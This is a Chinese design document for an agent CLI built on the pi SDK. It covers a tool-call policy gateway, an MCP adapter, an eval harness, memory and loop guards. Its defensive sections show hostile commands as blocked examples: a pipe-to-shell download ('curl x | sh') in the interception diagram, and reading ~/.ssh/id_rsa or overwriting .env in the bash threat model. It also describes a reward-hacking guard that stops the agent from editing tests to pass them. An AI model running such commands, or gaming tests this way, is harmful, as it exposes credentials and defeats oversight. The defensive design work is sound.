# Agent CLI 技术实现文档

> 配套《Agent CLI 需求文档 v2》。本文给出**落地级**设计:进程模型、代码结构、关键接口、核心算法、时序、测试策略。所有 pi 接口均为真实 API(`createAgentSession` / `DefaultResourceLoader` / `pi.on("tool_call")` / `pi.registerTool` / `pi.appendEntry` / `ctx.sessionManager.getBranch()` 等)。
>
> 设计红线:**pi 是库,不 fork;只在 pi 没覆盖的接缝加东西。** 四个新增模块——安全策略层、MCP adapter、eval harness、项目记忆——其余一律复用 pi。

---

## 1. 进程模型与启动时序

Agent CLI 是一个独立可执行文件,在进程内通过 SDK 拉起 pi 的一个 `session`,并把自研逻辑以 **in-process 扩展工厂**(`extensionFactories`)挂到 pi 的事件总线上。

**启动时序(`agent "<task>"`):**

```
main.ts
 1. parseArgs            → { subcommand, cwd, approvalMode, prompt, printMode }
 2. loadProjectContext   → .agent/policy.json + project-profile.json + memory.md (+ pi 的 AGENTS.md)
 3. buildResourceLoader  → DefaultResourceLoader({
                              cwd, agentDir,
                              extensionFactories: [policyGateway, loopGuards, traceRecorder,
                                                   commandTimeoutBash, rememberTool,
                                                   ...(mode !== "readonly" ? [mcpAdapter] : []),
                                                   ...extra],
                              appendSystemPromptOverride: 追加 profile/memory(不替换 pi 基底)
                            }); await rl.reload()
 4. computeTools(mode)   → readonly: ["read","grep","find","ls"]
                            其余: ["read","grep","find","ls","edit","write","bash","remember"]
 5. create session        → readonly: createAgentSession({ ..., tools: computeTools("readonly") })
                            非 readonly: createAgentSession({ ..., noTools: "builtin" })
 6. session.setActiveToolsByName(computeTools(mode))
 7. drive(session)       → interactive(TUI) | print(-p): session.subscribe + session.prompt
 8. finally session.dispose()
```

**关键点**:`readonly` 的"硬隔离"来自传给 pi 的 `tools` 全局 allowlist,不是提示词。非 `readonly` 模式不再传 `tools` allowlist,而是用 `noTools: "builtin"` 创建 session 后再调用 `setActiveToolsByName()` 激活基础工具,避免 pi 的全局 allowlist 把 `session_start` 动态注册的 `mcp__*` 工具过滤掉。两种驱动方式都复用 pi:交互走 TUI runtime,`-p` 走本项目的 bare-session driver 并显式 `bindExtensions({})` 触发 `session_start`。

---

## 2. 代码结构

独立仓库,依赖 pi 三个包:

```
agent-cli/
├── package.json            # deps: @earendil-works/{pi-coding-agent,pi-ai,pi-tui}, typebox, commander
├── src/
│   ├── main.ts             # 入口:argparse → 子命令 dispatch
│   ├── cli/
│   │   ├── args.ts         # commander 定义
│   │   └── commands/       # ask/init/resume/history/diff/undo/review/eval/mcp.ts
│   ├── runtime/
│   │   ├── session-factory.ts   # createAgentSession 封装 + computeTools(mode)
│   │   ├── resource-loader.ts    # 扩展工厂链 + 系统提示注入(profile/memory)
│   │   ├── driver.ts             # interactive / print 两种驱动
│   │   ├── bash-timeout.ts       # ★ bash 命令超时包装(§9)
│   │   ├── bash-timeout-core.ts  # 超时核心(纯函数,可测)
│   │   └── model.ts              # 模型解析
│   ├── policy/             # ★ 安全策略层(§4)
│   │   ├── types.ts        # ApprovalMode / PolicyConfig / Verdict
│   │   ├── engine.ts       # classify(event, mode) → Verdict
│   │   ├── command-classifier.ts
│   │   ├── path-guard.ts
│   │   └── gateway.ts      # extensionFactory: pi.on("tool_call")
│   ├── mcp/                # ★ MCP adapter(§5)
│   │   ├── stdio-client.ts # 持久 stdio JSON-RPC 客户端
│   │   ├── adapter.ts      # extensionFactory: discovery + registerTool 桥接
│   │   ├── schema-map.ts   # JSON Schema 子集 → TypeBox 映射
│   │   ├── config.ts       # .agent/mcp.json 读写
│   │   └── types.ts        # McpServerConfig / McpToolInfo
│   ├── eval/               # ★ eval harness(§6)
│   │   ├── harness.ts      # 跑场景
│   │   ├── scoring.ts      # 评分 rubric
│   │   ├── report.ts       # 表格 + 回归 diff
│   │   └── fixtures/       # planted-bug repos + scenarios.json
│   ├── context/           # ★ 项目画像 + 记忆(§7)
│   │   ├── profile.ts
│   │   └── memory.ts
│   ├── trace/             # task 视图(基于 pi session 投影,§8)
│   │   ├── entries.ts
│   │   └── projection.ts
│   ├── loop/
│   │   ├── guards.ts            # extensionFactory: test-fix 预算/反作弊(§9)
│   │   ├── failure-signature.ts # 测试失败签名归一化
│   │   ├── test-file.ts         # 测试文件 / 修测试目标识别
│   │   └── types.ts
│   └── tools/
│       └── remember.ts          # ★ remember 工具:append memory.md(§7)
└── .agent/                 # 每个项目生成:policy.json / project-profile.json / memory.md
```

---

## 3. 集成层(runtime/)

### 3.1 session-factory.ts

```ts
import { createAgentSession, SessionManager, SettingsManager } from "@earendil-works/pi-coding-agent";
import { getModel } from "@earendil-works/pi-ai";
import type { ApprovalMode } from "../policy/types";

const WRITE_TOOLS = ["edit", "write"];
const EXEC_TOOLS = ["bash"];

export function computeTools(mode: ApprovalMode): string[] {
  const base = ["read", "grep", "find", "ls"];
  if (mode === "readonly") return base;              // 硬隔离:不给写/执行工具
  return [...base, ...WRITE_TOOLS, ...EXEC_TOOLS, "remember"]; // suggest 的"不落盘"在 gateway 拦截
}

export async function buildSession(opts: {
  cwd: string; mode: ApprovalMode; resourceLoader: ResourceLoader;
}) {
  const model = getModel("anthropic", "claude-sonnet-4-6"); // 由 config.model 解析
  const toolOptions = opts.mode === "readonly"
    ? { tools: computeTools(opts.mode) }              // pi 全局 allowlist:硬边界
    : { noTools: "builtin" as const };                // 避免过滤运行期 mcp__* 工具
  const result = await createAgentSession({
    cwd: opts.cwd,
    model,
    ...toolOptions,
    resourceLoader: opts.resourceLoader,
    sessionManager: SessionManager.create(opts.cwd),       // ★ 单一真相源
    settingsManager: SettingsManager.inMemory({
      retry: { enabled: true, maxRetries: 2 },             // 委托 pi 处理 API 限流/5xx
    }),
  });
  result.session.setActiveToolsByName(computeTools(opts.mode));
  return result;
}
```

### 3.2 resource-loader.ts(系统提示注入)

用 `DefaultResourceLoader` 并挂载扩展工厂;profile/instructions/memory 通过 `additionalExtensionPaths` 不行——它们是**上下文**,走系统提示。两条路:

- 简单:把 profile/memory 渲染成一段文本,塞进 `getAppendSystemPrompt`。
- 干净:复用 pi 的 `AGENTS.md` 加载(pi 原生),`agent init` 时把 profile 摘要写进 `AGENTS.md`,memory 单独 append。

```ts
import { DefaultResourceLoader, getAgentDir } from "@earendil-works/pi-coding-agent";
import { policyGateway } from "../policy/gateway";
import { mcpAdapter } from "../mcp/adapter";
import { traceRecorder } from "../trace/entries";
import { loopGuards } from "../loop/guards";

export function buildResourceLoader(ctx: ProjectContext, opts?: { extraFactories?: ExtensionFactory[] }) {
  return new DefaultResourceLoader({
    cwd: ctx.cwd,
    agentDir: getAgentDir(),
    // 固定顺序:policy → loop → trace → bash timeout → remember → MCP(非 readonly) → extra
    extensionFactories: [
      policyGateway(ctx.policy, ctx.mode, ctx.cwd),
      loopGuards({ cwd: ctx.cwd, goal: ctx.goal, profile: ctx.profile, ...ctx.policy.limits }),
      traceRecorder({ goal: ctx.goal, mode: ctx.mode }),
      commandTimeoutBash(ctx.cwd, ctx.policy.limits.commandTimeoutMs),
      rememberTool(ctx.cwd),
      ...(ctx.mode !== "readonly" ? [mcpAdapter(ctx.cwd, ctx.policy.limits.commandTimeoutMs)] : []),
      ...(opts?.extraFactories ?? []),
    ],
    // profile/memory 作为上下文追加到系统提示(不替换 pi 基底)
    appendSystemPromptOverride: (base) => [...base, ...buildInjectedSystemPrompt(ctx)],
    // 注:DefaultResourceLoader 仍会自动加载 .pi/extensions、AGENTS.md 等
  });
}
```

> 每个 `extensionFactory` 是 `(pi: ExtensionAPI) => void`,与磁盘上的扩展同构,只是由我们在进程内显式注入,不依赖发现机制。

### 3.3 driver.ts

```ts
export async function drive(session, opts: { printMode: boolean; prompt: string }) {
  if (opts.printMode) {
    const unsubscribe = session.subscribe((e) => {
      if (e.type === "message_update" && e.assistantMessageEvent.type === "text_delta")
        process.stdout.write(e.assistantMessageEvent.delta);
    });
    try {
      await session.bindExtensions({});  // 触发 session_start,让 MCP 等扩展在 print 路径生效
      await session.prompt(opts.prompt);
    } finally {
      unsubscribe();
      session.dispose();
    }
  }
  // 交互模式:转交 pi 的 TUI runtime
}
```

---

## 4. 安全策略层(policy/)★

### 4.1 类型

```ts
export type ApprovalMode = "readonly" | "suggest" | "workspace-write" | "auto";

export interface PolicyConfig {
  command: { allow: string[]; confirm: string[]; deny: string[] };
  path: { deny: string[]; confirmWrite: string[] };       // glob
  limits: {
    maxChangedFiles: number;
    maxFixIterations: number;
    maxToolCalls: number;
    tokenBudget?: number;
    commandTimeoutMs?: number;
  };
  sandbox: { enabled: boolean };                           // v1.0 预留字段,未接 OS sandbox
}

export type Verdict =
  | { kind: "allow" }
  | { kind: "confirm"; reason: string }
  | { kind: "deny"; reason: string };
```

### 4.2 classify 算法(engine.ts)

输入 pi 的 `ToolCallEvent`(`event.toolName`, `event.input`)+ 当前 `mode`:

```
classify(event, mode):
  switch event.toolName:
    read | grep | find | ls:
        return path.deny.matches(target) ? deny("敏感文件读取") : allow   // 读保护可选

    write | edit | apply_patch:
        if mode == readonly: return deny("readonly 模式")                 // 防御性,正常已被工具白名单挡掉
        p = targetPath(event.input)
        if path.deny.matches(p):            return deny("受保护路径: " + p)
        if outsideRepoRoot(p):              return confirm("仓库外写入: " + p)
        if path.confirmWrite.matches(p):    return confirm("敏感配置: " + p)   // package.json/lockfile/CI
        if changedFileCount + 1 > limits.maxChangedFiles: return confirm("超过 N 文件批改")
        if mode == suggest:                 return confirm("suggest 模式:确认后才落盘")
        return allow

    bash:
        if mode == readonly: return deny("readonly 模式")
        tier = commandClassifier.tier(event.input.command)    // allow|confirm|deny
        if tier == deny:    return deny("高危命令: " + reason)
        if bashTouchesProtectedPath(event.input.command): return confirm("命令疑似写敏感路径")  // best-effort
        if tier == confirm: return confirm("需确认命令")
        return allow

    default: return confirm("未知工具默认确认")   // 含 mcp__*;总览 §3.3 的 C6 硬化项已落地
```

**模式与确认的统一收口**(gateway.ts):

```ts
export const policyGateway = (policy: PolicyConfig, mode: ApprovalMode) => (pi: ExtensionAPI) => {
  let changedFiles = 0;
  pi.on("agent_start", () => { changedFiles = 0; });
  pi.on("tool_call", async (event, ctx) => {
    const v = classify(event, mode, policy, changedFiles);
    if (v.kind === "deny")    return { block: true, reason: v.reason };
    if (v.kind === "confirm") {
      if (mode === "auto") {
        // auto 不弹窗,但 deny 已在上面硬生效;confirm 在 auto 下放行(deny≠放飞)
      } else {
        if (!ctx.hasUI) return { block: true, reason: v.reason + "(无 UI,保守阻断)" };  // -p 模式
        const ok = await ctx.ui.confirm("高风险操作", v.reason);
        if (!ok) return { block: true, reason: "用户拒绝" };
      }
    }
    if (event.toolName === "write" || event.toolName === "edit") changedFiles++;
    return undefined;  // 放行
  });
};
```

### 4.3 两个必须讲清的设计点

**① 阻断在落盘之前发生。** pi 的 agent-loop 在执行工具前先触发 `tool_call`,返回 `{block:true}` 即短路,**永不进入工具的 `execute`**,而 `file-mutation-queue` 在 `execute` 内部——所以 deny 一定在任何文件写入之前生效,无竞态。(证据:`agent-loop.ts` 的 `beforeResult.block` 分支;`tools/file-mutation-queue.ts`。)

**② bash 威胁模型(诚实表述)。** 路径黑名单挡不住 `cat ~/.ssh/id_rsa`、`> .env`。`bashTouchesProtectedPath` 是**字符串级 best-effort**(解析重定向 `>`/`>>`/`tee`、参数路径),定位为**减速带**,不号称安全边界。`policy.sandbox.enabled` 在 v1.0 仅作为预留字段读取并告警,尚未接入 `@anthropic-ai/sandbox-runtime`;OS 级 `denyRead/denyWrite` 是后续硬化项。

**③ suggest 模式的"不落盘"实现。** 当前采用 confirm gate 方案:`suggest` 下 `edit/write` 仍在 active tools 中,但 gateway 把写入类工具判为 `confirm`;确认前不会进入工具 `execute`,因此不会落盘。当前没有独立 `propose_patch` 工具;如未来要把"建议 patch"与"应用 patch"彻底拆开,需要另立工具与命令协议。

---

## 5. MCP Adapter(mcp/)★

### 5.1 客户端(stdio-client.ts)

stdio + JSON-RPC 2.0。**当前实现为持久连接模型**:每个 MCP server 在会话期间对应一个常驻 `McpStdioClient`;子进程只启动一次,`initialize` 握手只做一次,`tools/list` 与后续所有 `tools/call` 复用同一条 stdio 连接。

```ts
export class McpStdioClient {
  constructor(serverName: string, config: McpServerConfig, cwd: string, requestTimeoutMs?: number) {}
  start(): Promise<void>;                  // spawn + initialize,幂等
  async listTools(): Promise<McpToolInfo[]> { /* initialize → tools/list */ }
  async callTool(name: string, args: Record<string, unknown>, signal?: AbortSignal): Promise<unknown> {
    /* initialize → tools/call */
  }
  dispose(): void;
}
```

**生命周期与边界**:
- JSON-RPC 响应按 `id` 路由到对应 pending request;非 JSON stdout 行会被忽略。
- 每个请求有超时,默认由 adapter 传入 `policy.limits.commandTimeoutMs`。
- `AbortSignal` 只 reject 当前请求并清理 pending entry,不杀共享连接。
- server 崩溃或提前退出会 reject 所有在途请求并触发 `onClose`;adapter 会记录 `mcp-error`,并 best-effort 从 active tools 摘掉该 server 的工具。
- `dispose()` 由 `session_shutdown` 触发;print 路径裸 `session.dispose()` 不保证触发该事件,所以 `stdio-client.ts` 还注册了 `process.exit` 兜底 kill live children。
- 当前不做崩溃后的自动退避重连。

### 5.2 参数 schema(schema-map.ts)

当前已实现 JSON Schema → TypeBox 的子集映射。adapter 只在远端 `inputSchema` 顶层是 `object` 时使用 `toTypeBox()`;否则使用宽松 `Type.Record(Type.String(), Type.Any())`。

已覆盖的子集:

- `object` / `properties` / `required`
- `string` 与 string enum
- `number` / `integer` / `boolean`
- `array`
- `description`

复杂结构(`oneOf`、`anyOf`、`$ref`、缺失 `type`、递归分支等)回退为 `Type.Any()` 或外层宽松 record,不假装完整支持全部 JSON Schema。覆盖见 `test/mcp/schema-map.test.ts`。

### 5.3 桥接(adapter.ts,extensionFactory)

```ts
import { defineTool, truncateTail } from "@earendil-works/pi-coding-agent";
import { Type } from "typebox";

export function mcpAdapter(cwd: string, requestTimeoutMs = 120_000): ExtensionFactory {
  return (pi) => {
    pi.on("session_start", async () => {
      const config = loadMcpConfig(cwd);
      for (const [serverName, server] of Object.entries(config.servers)) {
        const client = new McpStdioClient(serverName, server, cwd, requestTimeoutMs);
        let tools = [];
        try {
          tools = await client.listTools();
        } catch (err) {
          pi.appendEntry("mcp-error", { server: serverName, message: String(err) });
          client.dispose();
          continue;                                       // 该 server 本轮跳过,不卡 loop
        }
        const toolNames = tools.map((tool) => `mcp__${serverName}__${tool.name}`.replace(/[^A-Za-z0-9_]/g, "_"));
        client.setOnClose((error) => {
          pi.appendEntry("mcp-error", { server: serverName, message: error.message });
          pi.setActiveTools(pi.getActiveTools().filter((name) => !toolNames.includes(name)));
        });
        for (const tool of tools) {
          pi.registerTool(defineTool({
            name: `mcp__${serverName}__${tool.name}`.replace(/[^A-Za-z0-9_]/g, "_"),
            label: `mcp:${serverName}/${tool.name}`,
            description: tool.description ?? `MCP tool ${tool.name} from ${serverName}`,
            parameters: hasTopLevelObjectSchema(tool.inputSchema)
              ? toTypeBox(tool.inputSchema)
              : Type.Record(Type.String(), Type.Any()),
            async execute(_id, params, signal) {
              const result = await client.callTool(tool.name, params, signal);
              const text = truncateTail(resultText(result), { maxBytes: 8_000 }).content;
              pi.appendEntry("mcp-tool-call", { server: serverName, tool: tool.name });
              return { content: [{ type: "text", text }], details: result };
            },
          }));
        }
        pi.setActiveTools([...new Set([...pi.getActiveTools(), ...toolNames])]);
      }
    });
  };
}
```

**要点**:工具名 `mcp__<server>__<tool>` 并清洗非法字符避免冲突;大输出复用 pi 的 `truncateTail(...).content`;`tools/list` 失败 → 记 `mcp-error` 并跳过该 server(不卡 loop);工具执行复用持久连接并透传取消信号。MCP 工具名落到 `engine` 的未知工具分支 → 默认 `confirm`(§4.2),仍过策略网关。`readonly` 模式下 `resource-loader` 不注册 MCP adapter,这是只读硬隔离的一部分。

### 5.4 Demo 路径

`agent mcp add <server>`(写 `.agent/mcp.json`)→ 非 `readonly` 会话启动时 adapter 在 `session_start` 发现工具并注册(`mcp__<server>__*`)→ agent 调用(经 §4 gateway 的 confirm)→ 结果 `truncateTail` 后回灌。当前 hero 脚本只做 `agent mcp list` 配置 smoke,不承诺完整 GitHub issue 修复链路。

---

## 6. Eval Harness(eval/)★

> 这是把项目从"演示"抬到"工程"的核心,也是面试最高信号。

### 6.1 场景格式(fixtures/scenarios.json)

```jsonc
[{
  "id": "expired-token-401",
  "repo": "fixtures/hono-api",            // 含 planted bug 的快照
  "prompt": "修复登录 token 过期返回 500 的问题,应返回 401,并补测试",
  "mode": "workspace-write",
  "checks": {
    "bugLocated":  { "grep": "src/middleware/auth\\.ts" },
    "testsPass":   { "cmd": "pnpm test" },
    "diffTouches": { "globs": ["src/middleware/**", "**/*.test.ts"] },
    "addedTest":   { "grep": "401" },
    "inBounds":    true                    // 未触发 deny / 未越权
  }
}]
```

### 6.2 Runner(harness.ts)

```
for scenario in scenarios:
  tmp = copyFixtureToTemp(scenario.repo)
  session = buildSession({ cwd: tmp, mode: scenario.mode, provider })   // headless,复用 §3
  capture deny/confirm 事件(经 policy gateway 的 hook 计数)
  await session.prompt(scenario.prompt)
  await waitFor("agent_end")
  result = scoring.run(scenario.checks, tmp)
  record(model, scenario.id, result)
report.render(records, previousRun)
```

`provider`:CI 用 pi 的**录制式假 provider**(`test/suite/harness.ts` 的 faux provider 模式)做确定性回归;真跑用真实 provider。

### 6.3 评分(scoring.ts)与报告(report.ts)

每个 check 输出 `{pass, reason}`;场景 pass = 全部硬 check 通过。报告是 **model × scenario** 矩阵 + 与上一次 run 的 **回归 diff**(谁从 pass 变 fail)。回归基线存 `.agent/eval/baseline.json`。

```
              expired-token-401   null-deref   sql-injection
sonnet-4-6          PASS             PASS          FAIL(-)      ← 相比基线退化
opus-4-8            PASS             PASS          PASS
```

---

## 7. 项目画像与记忆(context/)★

```ts
// profile.ts:探测并持久化 pi 不存的结构化画像
export interface ProjectProfile {
  language: string; packageManager: string; framework?: string;
  testFramework?: string; sourceDirs: string[]; testDirs: string[];
  commands: { test?: string; lint?: string; build?: string };
}
export async function detectProfile(cwd: string): Promise<ProjectProfile> {
  // 读 package.json/pyproject.toml/go.mod;探测 lockfile 定包管理器;扫描 test 目录
}
```

`memory.md`:跨会话长期记忆(pi 只有单会话)。`agent init` 生成骨架;agent 可经一个自研 `remember` 工具 append。两者在 `getAppendSystemPrompt` 注入,与 pi 的 `AGENTS.md` 并存(优先级见 §10)。

---

## 8. 持久化与 Task Trace(trace/)★

**单一真相源 = pi 的树状 session JSONL。** 不另起 `task_*.json`。

```ts
// entries.ts:把 pi 没有的元数据写进 pi 的 session
export const traceRecorder = (goal: string, mode: string) => (pi: ExtensionAPI) => {
  pi.on("agent_start", () => pi.appendEntry("task-meta", { goal, mode, startedAt: nowIso() }));
  pi.on("agent_end", (e) => pi.appendEntry("task-result", { status: "done", turns: e.messages.length }));
  // tool 调用 / 结果 / 改动文件已在 pi 原生 entry 里,无需重复记录
};
```

```ts
// projection.ts:从 pi session 投影出只读 task 视图
export function projectTask(ctx: ExtensionContext): TaskView {
  const entries = ctx.sessionManager.getBranch();   // 当前分支,天然支持 fork/resume
  return {
    goal: pick(entries, "task-meta")?.goal,
    toolCalls: entries.filter(isToolCall).map(toToolCallView),
    modifiedFiles: dedupe(entries.filter(isEdit).map(p => p.path)),
    result: pick(entries, "task-result"),
  };
}
```

- `agent history` = 列 pi 的 sessions(按 cwd);
- `agent resume [id]` = 映射到 pi 的 `--resume` / leafId,**不发明 task_id**;
- `agent diff` / `agent undo` = 复用 pi 的 edit-diff 渲染 + git-checkpoint(`git stash` 快照),undo **只撤文件**,命令副作用不在范围(明示)。

---

## 9. 控制流与预算(loop/guards.ts)★

> "不用 LangGraph":循环本身是 pi 的 agent loop;**守卫是我的**。一个扩展工厂搞定。

```ts
export const loopGuards = (limits: Limits, profile: ProjectProfile) => (pi: ExtensionAPI) => {
  let toolCalls = 0, fixRounds = 0; const failedSig = new Set<string>();
  pi.on("agent_start", () => { toolCalls = 0; });

  pi.on("tool_call", async (event) => {
    // ① 调用预算
    if (++toolCalls > limits.maxToolCalls)
      return { block: true, reason: `超出工具调用预算(${limits.maxToolCalls}),已停止并产出现状` };

    // ② 反作弊:修测试任务里禁止改测试文件
    if ((event.toolName === "edit" || event.toolName === "write") && isTestFile(targetPath(event.input), profile))
      return { block: true, reason: "检测到改动测试文件以骗过测试,已阻断(reward-hacking guard)" };

    return undefined;
  });

  // ③ 无进展检测:同一组失败连续两轮 → 停
  pi.on("tool_result", (e) => {
    if (isTestRun(e)) {
      const sig = hashFailures(e.output);
      if (failedSig.has(sig) && ++fixRounds >= limits.maxFixIterations)
        pi.sendMessage({ content: "测试反复失败且无进展,停止修复,产出 diff 与失败摘要交人。", customType: "loop-guard" }, { deliverAs: "followUp", triggerTurn: true });
      failedSig.add(sig);
    }
  });
};
```

- **预算**:`maxToolCalls` / `maxFixIterations`;token 预算由 `loopGuards` 在 `message_end` 累计 assistant usage,超限后发送 soft-stop,并在下一次 `tool_call` 前阻断。
- **失败保全**:停止时不回滚,保留 diff + 失败摘要(`git-checkpoint` 保证可回溯)。
- **防作弊**:`isTestFile` 用 `profile.testDirs` + glob 判定。

---

## 10. 配置与优先级

```
.agent/
├── policy.json            # §4 安全/审批 + limits + sandbox
├── project-profile.json   # §7 探测画像
└── memory.md              # §7 跨会话记忆
```

**优先级(高→低)**:CLI flag > `.agent/policy.json` > pi 默认。
**与 pi 不重复**:项目约定复用 pi 的 `AGENTS.md`(不再造 instructions.md);模型/重试等复用 pi 的 settings,只在 `.agent/` 放 pi 确实没有的(策略、画像、记忆)。

---

## 11. 错误处理(委托 vs 自管)

| 失败 | 归属 | 处理 |
|---|---|---|
| API 限流/5xx/超时 | pi | `SettingsManager` retry |
| 畸形 tool args | pi | 工具 schema 校验 / `prepareArguments` |
| 大输出爆上下文 | pi | `truncateHead/Tail` / OutputAccumulator |
| Ctrl-C / SIGTERM | pi+我 | 接 abort signal → §9 失败保全 |
| 测试命令挂死 | 我 | bash 命令超时 → AbortSignal 中止本次执行 → 回灌 timeout 错误;进程树终止按平台 best-effort |
| patch fuzzy 失败 | pi+我 | pi 报无法定位;我不静默写错位置,转 confirm/停 |
| MCP server 崩溃 / `tools/list` 失败 | 我 | 记 `mcp-error` entry;`tools/list` 失败跳过该 server;运行中崩溃 reject 在途请求并 best-effort 摘掉 active tools;不做自动退避重连 |
| 预算耗尽 | 我 | tokenBudget 超限后发 soft-stop,并在下一次 `tool_call` 前阻断;不是 provider 请求前硬上限 |

当前覆盖状态:
- command timeout: `test/integration/command-timeout.test.ts` 覆盖真实 bash 长跑命令被 `commandTimeoutMs` 中止并返回 timeout 错误;跨平台进程树清理仍按 best-effort 表述。
- SIGTERM abort: `test/integration/abort-failsafe.test.ts` 覆盖 print driver 在 SIGTERM 时保留 modified files、写 `abort-preserved` 与 failed `task-result` 并 dispose session。
- token budget: `test/integration/token-budget.test.ts` 覆盖 usage 超额后 soft-stop,并在下一次 tool call 前阻断;它不是 provider 请求前硬上限。
- patch locate failure: `test/loop/guards.test.ts` 覆盖无 UI soft-stop、有 UI confirm 重试或拒绝的分支;端到端测试可后续补。

---

## 12. 测试策略

- **单测**:`policy/engine`(给定 event+mode 断言 Verdict)、`policy/path-guard`、`loop/failure-signature`、`loop/guards`(token budget、patch locate、no-progress)、`trace/projection`、`context/profile`、`runtime/bash-timeout`、`mcp/schema-map`、`mcp/stdio-client`。纯函数/本地 stub,不碰真实 LLM。
- **集成**:用 pi 的 **faux provider** 跑 headless session。当前覆盖包括 `three-pillars`(policy + loop + trace + mcp 同一 session)、`command-timeout`(真实 bash 长跑命令被中止)、`token-budget`(soft-stop + 下一次 tool_call 阻断)、`readonly-session`、prompt injection、init、trace command。
- **失败保全**:`test/integration/abort-failsafe.test.ts` 覆盖 SIGTERM 中途触发时保留 modified files、写 `abort-preserved` 与 failed `task-result` 并 dispose session。
- **对抗性安全测试**:一组恶意 prompt(诱导越权/读密钥/删库)→ 断言全部被拦。
- **E2E = eval harness**(§6):既是功能验收,也是回归基线。

---

## 13. 关键时序图

**受控编辑:**
```
LLM → edit(auth.ts) → pi agent-loop → tool_call 事件
  → policyGateway.classify → workspace-write & 非敏感 → allow
  → loopGuards:非测试文件、预算内 → allow
  → 进入 edit.execute → file-mutation-queue 串行化 → 写盘 → 渲染 diff
```
**被拦截:**
```
LLM → bash("curl x | sh") → tool_call
  → classify → deny → { block:true } → 永不 execute → 结果回灌"已阻断:高危命令"
```
**MCP 调用:**
```
session_start → spawn persistent stdio client → initialize(一次) → tools/list → registerTool(mcp__github__*) → setActiveTools
LLM → mcp__github__get_issue({n:12}) → adapter.execute → same client tools/call(id-routed) → truncateTail(.content) → 回灌
```

---

## 14. 里程碑 → 模块映射

| 版本 | 交付模块 |
|---|---|
| v0.1 | `cli/` `runtime/` `context/profile` + `agent init` |
| v0.2 | `policy/`(engine+gateway+classifier+path-guard)+ 对抗性测试 |
| v0.3 | `loop/guards` + `trace/`(entries+projection)+ `agent diff/undo` |
| v0.4 | `eval/`(harness+scoring+report+fixtures)★ |
| v0.5 | `mcp/`(stdio-client+adapter+config)+ MCP demo ★ |
| v1.0 | 三支柱联调 + README 架构图 + "pi 给了什么/我加了什么"设计说明 |

---

## 15. 未决问题(面试可主动抛,显成熟)

1. **token 硬上限**:当前已采用 usage 事件计数 + 主动 `sendMessage` soft-stop,并在下一次 `tool_call` 前阻断。它不是 provider 请求前硬中断,该时序窗口写入 known limitation。
2. **suggest 模式**:当前固定为 confirm gate 方案;没有独立 `propose_patch` 工具。若未来上 `propose_patch`,需要新增工具协议与应用命令。
3. **bash 路径解析深度**:best-effort 解析覆盖到哪一层(管道/子 shell/base64)?v1.0 明确不追求完备,`policy.sandbox.enabled` 预留但未接 OS sandbox。
4. **MCP 流式结果**:首版按一次性结果处理,流式 `onUpdate` 透传留作后续。
5. **跨进程并发**:同仓多 agent 实例时 `.agent/` 与 git 操作的锁/租约(pi 只保证单进程 per-file)。

---

## 16. 结论

实现层面,本项目 = **一个 SDK 驱动的进程外壳 + 四个 in-process 扩展工厂(策略 / MCP / trace / 守卫)+ 一个 headless eval runner**。pi 提供 loop、工具、会话、压缩、截断、重试;我提供策略、集成、度量、记忆。每个模块都能指着 pi 的某个真实接口说清"这里复用、那里我加"——这正是把一个 agent 真正交付上线所需的工程。
